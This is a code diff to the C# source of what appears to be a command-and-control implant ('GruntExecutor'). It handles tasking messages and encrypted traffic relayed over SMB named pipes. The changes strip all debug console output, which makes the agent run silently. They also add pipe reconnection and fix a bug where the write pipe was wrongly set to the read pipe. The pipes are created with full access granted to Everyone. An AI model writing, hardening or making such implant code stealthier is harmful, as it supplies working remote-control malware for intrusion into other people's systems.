@@ -243,7 +243,6 @@ namespace GruntExecutor
 
         private static IntPtr TaskExecute(TaskingMessenger messenger, GruntTaskingMessage message, int Delay)
         {
-            Console.WriteLine("Exceuting task");
             const int MAX_MESSAGE_SIZE = 1048576;
             string output = "";
             try
@@ -476,7 +475,6 @@ namespace GruntExecutor
 
         public GruntTaskingMessage ReadTaskingMessage()
         {
-            Console.WriteLine("Calling ReadTaskingMessage");
             ProfileMessage readMessage = null;
             lock (_UpstreamLock)
             {
@@ -519,7 +517,6 @@ namespace GruntExecutor
 
         public void QueueTaskingMessage(string Message, string Meta = "")
         {
-            Console.WriteLine("Calling QueueTaskingMessage");
             GruntEncryptedMessage gruntMessage = this.Crafter.Create(Message, Meta);
             string uploaded = this.Profile.FormatWriteFormat(gruntMessage);
             lock (_MessageQueueLock)
@@ -530,7 +527,6 @@ namespace GruntExecutor
 
         public void WriteTaskingMessage()
         {
-            Console.WriteLine("Calling WriteTaskingMessage");
             try
             {
                 lock (_UpstreamLockW)
@@ -663,7 +659,6 @@ namespace GruntExecutor
 
         public SMBMessenger(PipeStream Pipe, PipeStream PipeWrite, string Pipename)
         {
-            Console.WriteLine("Initializing SMBMessenger");
             this.Pipe = Pipe;
             this.PipeWrite = PipeWrite;
             this.PipeName = Pipename;
@@ -716,6 +711,11 @@ namespace GruntExecutor
                 {
                     this.InitializePipe();
                 }
+                // If pipe is not connected.
+                else if (!this._PipeWrite.IsConnected)
+                {
+                    this.InitializePipe();
+                }
                 if (this.IsConnected)
                 {
                     this.WriteBytes(Common.GruntEncoding.GetBytes(Message));
@@ -732,7 +732,6 @@ namespace GruntExecutor
         public void Close()
         {
             // Close named pipe and terminate MonitoringThread by setting IsConnected to false
-            Console.WriteLine("Closing pipes");
             lock (this._PipeLock)
             {
                 try
@@ -768,17 +767,15 @@ namespace GruntExecutor
                 // If named pipe became disconnected (!this.IsConnected), then wait for a new incoming connection, else continue.
                 if (this.IsServer)
                 {
-                    Console.WriteLine("Creating read pipe");
                     PipeSecurity ps = new PipeSecurity();
                     ps.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));
                     NamedPipeServerStream newServerPipe = new NamedPipeServerStream(this.PipeName, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);
                     newServerPipe.WaitForConnection();
                     this.Pipe = newServerPipe;
 
-                    Console.WriteLine("Creating write pipe");
                     NamedPipeServerStream newServerPipeWrite = new NamedPipeServerStream(this.PipeNameWrite, PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances, PipeTransmissionMode.Byte, PipeOptions.Asynchronous, 1024, 1024, ps);
                     newServerPipeWrite.WaitForConnection();
-                    this.PipeWrite = newServerPipe;
+                    this.PipeWrite = newServerPipeWrite;
 
                     this.IsConnected = true;
                     this.MonitorPipeState();
@@ -803,8 +800,7 @@ namespace GruntExecutor
         {
             this.MonitoringThread = new Thread(() =>
             {
-                Console.WriteLine("Entering MonitoringThread");
-                while (this.IsConnected)
+            while (this.IsConnected)
                 {
                     try
                     {
@@ -819,7 +815,6 @@ namespace GruntExecutor
                         if (!this.IsConnected)
                         {
                             // Close both pipes on error from one of them.
-                            Console.WriteLine("Pipe not connected! closing them.");
                             this._Pipe.Close();
                             this._Pipe = null;
                             this._PipeWrite.Close();
